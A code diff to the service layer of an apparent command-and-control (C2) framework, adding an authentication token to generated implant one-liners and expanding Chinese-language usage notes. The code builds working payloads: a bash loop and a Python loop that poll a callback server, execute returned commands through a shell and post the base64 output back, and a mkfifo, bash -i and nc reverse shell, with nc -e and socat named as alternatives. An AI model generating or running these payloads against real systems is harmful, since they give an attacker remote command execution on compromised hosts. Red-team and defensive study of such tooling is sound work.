@@ -6,6 +6,7 @@ from sqlalchemy import Engine
 
 from axiom.modules.c2.listeners import ListenerManager
 from axiom.modules.c2.repository import C2Repository
+from axiom.modules.c2.token import c2_listener_token
 from axiom.modules.c2.schemas import (
     C2ExecCommand,
     C2Listener,
@@ -89,32 +90,40 @@ class C2Service:
         listener = self.get_listener(task_id, listener_id)
         host = listener.host if listener.host not in {"0.0.0.0", "::"} else "<回连地址>"
         base = f"http://{host}:{listener.port}"
+        token = c2_listener_token(listener_id)
         if listener.kind == "http":
             bash = (
                 f"H=$(hostname | md5sum | cut -c1-8); while :; do "
-                f"C=$(curl -s -m 10 '{base}/index?sid='\"$H\"); "
+                f"C=$(curl -s -m 10 '{base}/index?sid='\"$H\"'&token={token}'); "
                 f"if [ -n \"$C\" ]; then R=$(bash -c \"$C\" 2>&1 | base64 | tr -d '\\n'); "
-                f"curl -s -m 10 -X POST --data-binary \"$R\" '{base}/index?sid='\"$H\" >/dev/null; fi; "
+                f"curl -s -m 10 -X POST --data-binary \"$R\" '{base}/index?sid='\"$H\"'&token={token}' >/dev/null; fi; "
                 f"sleep 5; done &"
             )
             python = (
                 "python3 -c \"import base64 as b,socket,subprocess as s,urllib.request as u,time;"
                 "sid=socket.gethostname()[:8];"
                 "exec('while True:\\n"
-                f" c=u.urlopen(\\\"{base}/index?sid=\\\"+sid,timeout=10).read().decode()\\n"
+                f" c=u.urlopen(\\\"{base}/index?sid=\\\"+sid+\\\"&token={token}\\\",timeout=10).read().decode()\\n"
                 " if c:\\n"
                 "  r=b.b64encode(s.run(c,shell=True,capture_output=True).stdout).decode()\\n"
-                f"  u.urlopen(u.Request(\\\"{base}/index?sid=\\\"+sid,data=r.encode(),method=\\\"POST\\\"),timeout=10).read()\\n"
+                f"  u.urlopen(u.Request(\\\"{base}/index?sid=\\\"+sid+\\\"&token={token}\\\",data=r.encode(),method=\\\"POST\\\"),timeout=10).read()\\n"
                 " time.sleep(5)')\" &"
             )
-            note = "sleep 与 sid 可按需调整；base64 回传避免二进制破坏。回连地址需目标可达。"
+            note = (
+                "sleep 与 sid 可按需调整；URL 中的 token 是监听器鉴权凭据，不要泄露；"
+                "base64 回传避免二进制破坏。回连地址需目标可达。"
+            )
             return C2Oneliner(listener_id=listener_id, kind="http", bash=bash, python=python, note=note)
         bash = f"mkfifo /tmp/.axf; /bin/bash -i < /tmp/.axf 2>&1 | nc {host} {listener.port} > /tmp/.axf &"
         return C2Oneliner(
             listener_id=listener_id,
             kind="tcp",
             bash=bash,
-            note="tcp 为原始 socket 会话：命令按行下发，输出读至 1.5s 静默。也可用 nc -e / socat 等自备方式回连。",
+            note=(
+                "tcp 为原始 socket 会话：命令按行下发，输出读至 1.5s 静默。"
+                "该模式没有 token 握手，未鉴权；仅可在受信网络使用，公网请用 http 监听。"
+                "也可用 nc -e / socat 等自备方式回连。"
+            ),
         )
 
     # ------------------------------------------------------------ sessions
